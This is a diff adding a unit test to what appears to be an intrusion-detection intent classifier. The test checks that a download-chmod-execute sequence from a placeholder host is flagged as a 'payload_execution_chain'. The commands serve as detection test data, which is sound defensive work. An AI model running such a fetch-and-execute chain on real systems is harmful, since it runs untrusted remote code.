@@ -188,3 +188,27 @@ def test_execution_has_execution_phase():
     )
 
     assert execution.phase == "execution"
+
+
+def test_classifier_reports_payload_execution_chain():
+    classifier = IntentClassifier()
+
+    results = classifier.classify(
+        [
+            "wget http://example.test/payload",
+            "chmod +x payload",
+            "./payload",
+        ]
+    )
+
+    chain = next(
+        result for result in results
+        if result.intent == "payload_execution_chain"
+    )
+
+    assert chain.phase == "execution"
+    assert chain.evidence == [
+        "wget http://example.test/payload",
+        "chmod +x payload",
+        "./payload",
+    ]
